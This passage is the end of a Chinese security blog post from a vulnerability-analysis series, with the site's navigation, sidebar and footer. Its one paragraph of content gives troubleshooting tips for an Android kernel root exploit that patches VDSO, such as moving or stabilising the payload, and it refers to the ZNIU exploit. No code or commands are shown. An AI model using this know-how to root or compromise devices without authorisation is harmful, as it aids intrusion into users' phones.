<p>而当payload写入完成，会发现手机立马重启了，这里分析失败的原因可能有两种。第一种是patch VDSO破坏了完整性，适当提高payload的位置。第二种是payload的问题，写一个更稳定的payload。碍于调试环境不方便你，花费太多时间，大家可以对比一下ZNIU的利用方法，相信就可以掌握了。</p>

        
    

    
</div>


                

                <!-- Post Comments -->
                
                    
                
            </div>

            <!-- Post Prev & Next Nav -->
            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
    <!-- Prev Nav -->
    
        <a href="/2018/漏洞分析一百篇-02-Adobe Reader TTF字体SING表栈溢出漏洞/" id="post_nav-newer" class="prev-content">
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_back</i>
            </button>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            新篇
        </a>
    

    <!-- Section Spacer -->
    <div class="section-spacer"></div>

    <!-- Next Nav -->
    
        <a href="/2018/漏洞分析一百篇-04-pingpongroot-WX利用/" id="post_nav-older" class="next-content">
            旧篇
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_forward</i>
            </button>
        </a>
    
</nav>

        </div>
    </div>



                    
                        <!-- Overlay For Active Sidebar -->
<div class="sidebar-overlay"></div>

<!-- Material sidebar -->
<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
    <div id="sidebar-main">
        <!-- Sidebar Header -->
        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
    <!-- Top bar -->
    <div class="top-bar"></div>

    <!-- Sidebar toggle button -->
    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
        <i class="material-icons">clear_all</i>
        <span class="mdl-button__ripple-container">
            <span class="mdl-ripple">
            </span>
        </span>
    </button>

    <!-- Sidebar Avatar -->
    <div class="sidebar-image">
        <img src="/img/avatar.jpeg" alt="leo00000's avatar">
    </div>

    <!-- Sidebar Email -->
    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
        leo3.14@foxmail.com
        <b class="caret"></b>
    </a>
</div>


        <!-- Sidebar Navigation  -->
        <ul class="nav sidebar-nav">
    <!-- User dropdown  -->
    <li class="dropdown">
        <ul id="settings-dropdown" class="dropdown-menu">
            
                <li>
                    <a href="#" target="_blank" title="Email Me">
                        
                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
                        
                        Email Me
                    </a>
                </li>
            
        </ul>
    </li>

    <!-- Homepage -->
    
        <li id="sidebar-first-li">
            <a href="/">
                
                    <i class="material-icons sidebar-material-icons">home</i>
                
                主页
            </a>
        </li>
        
    

    <!-- Archives  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">inbox</i>
                
                    归档
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
            <li>
                <a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">8</span></a>
            </ul>
        </li>
        
    

    <!-- Categories  -->
    

    <!-- Pages  -->
    
        <li>
            <a href="/tags" title="标签云">
                
                    <i class="material-icons sidebar-material-icons">cloud_circle</i>
                
                标签云
            </a>
        </li>
        
            <li class="divider"></li>
        
    

    <!-- Article Number  -->
    
        <li>
            <a href="/archives">
                文章总数
                <span class="sidebar-badge">8</span>
            </a>
        </li>
        
    
</ul>


        <!-- Sidebar Footer -->
        <!--
I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
It will not impact the appearance and can give developers a lot of support :)

很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
它不会影响美观并可以给开发者很大的支持和动力。 :)
-->

<!-- Sidebar Divider -->

    <div class="sidebar-divider"></div>


<!-- Theme Material -->

    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
            主题 - Material
            <span class="sidebar-badge badge-circle">i</span>
        </div>
    </a>


<!-- Help & Support -->
<!--

-->

<!-- Feedback -->
<!--

-->

<!-- About Theme -->
<!--

-->

    </div>

    <!-- Sidebar Image -->
    

</aside>

                    

                    
                        <!-- Footer Top Button -->
                        <div id="back-to-top" class="toTop-wrap">
    <a href="#top" class="toTop">
        <i class="material-icons footer_top-i">expand_less</i>
    </a>
</div>

                    

                    <!--Footer-->
<footer class="mdl-mini-footer" id="bottom">
    
        <!-- Paradox Footer Left Section -->
        <div class="mdl-mini-footer--left-section sns-list">
    <!-- Twitter -->
    

    <!-- Facebook -->
    

    <!-- Google + -->
    

    <!-- Weibo -->
    

    <!-- Instagram -->
    

    <!-- Tumblr -->
    

    <!-- Github -->
    
        <a href="https://github.com/leo00000" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
                <span class="visuallyhidden">Github</span>
            </button><!--
     --></a>
    

    <!-- LinkedIn -->
    

    <!-- Zhihu -->
    
        <a href="https://www.zhihu.com/people/yang-xiao-niu-6-92-41/activities" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-zhihu">
                <span class="visuallyhidden">Zhihu</span>
            </button><!--
     --></a>
    

    <!-- Bilibili -->
    

    <!-- Telegram -->
    
    
    <!-- V2EX -->
    
</div>


        <!--Copyright-->
        <div id="copyright">
            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>leo00000的个人博客
            
                <br>
                
                    <a class="footer-develop-a" href="https://coding.net/pages " rel="nofollow" target="_blank">Hosted by Coding Pages</a>
                
            
        </div>

        <!-- Paradox Footer Right Section -->

        <!--
        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
        It will not impact the appearance and can give developers a lot of support :)

        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
        它不会影响美观并可以给开发者很大的支持。 :)
        -->

        <div class="mdl-mini-footer--right-section">
            <div>
                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
            </div>
        </div>
    
</footer>


                    <!-- Import JS File -->

    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>



    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>



    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>


<script type="text/ls-javascript" id="NProgress-script">
    NProgress.configure({
        showSpinner: true
    });
    NProgress.start();
    $('#nprogress .bar').css({
        'background': '#29d'
    });
    $('#nprogress .peg').css({
        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
    });
    $('#nprogress .spinner-icon').css({
        'border-top-color': '#29d',
        'border-left-color': '#29d'
    });
    setTimeout(function() {
        NProgress.done();
        $('.fade').removeClass('out');
    }, 800);
</script>



    
        <script>lsloader.load("sm_js","/js/smoothscroll.js?lOy/ACj5suSNi7ZVFVbpFQ==", true)</script>
    





    <!-- Busuanzi -->
    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>







<!-- UC Browser Compatible -->
<script>
	var agent = navigator.userAgent.toLowerCase();
	if(agent.indexOf('ucbrowser')>0) {
		document.write('<link rel="stylesheet" href="/css/uc.css">');
	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
	}
</script>

<!-- Import prettify js  -->

    
        
            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
        
    



<!-- Window Load -->
<!-- add class for prettify -->
<script type="text/ls-javascript" id="window-load">
    $(window).on('load', function() {
        // Post_Toc parent position fixed
        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
    });

    
        
            $(function() {
                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
                prettyPrint();
                })
        
    
    
</script>

<!-- MathJax Load-->


<!-- Bing Background -->


<script type="text/ls-javascript" id="lazy-load">
    // Offer LazyLoad
    queue.offer(function(){
        $('.lazy').lazyload({
            effect : 'show'
        });
    });

    // Start Queue
    $(document).ready(function(){
        setInterval(function(){
            queue.execNext();
        },200);
    });
</script>

<!-- Custom Footer -->



<script>
    (function(){
        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')

        for (var i = 0; i < scriptList.length; ++i) {
            var item = scriptList[i];
            lsloader.runInlineScript(item.id,item.id);
        }
    })()
console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
</script>

                </main>
            </div>
        </body>
    
</html>
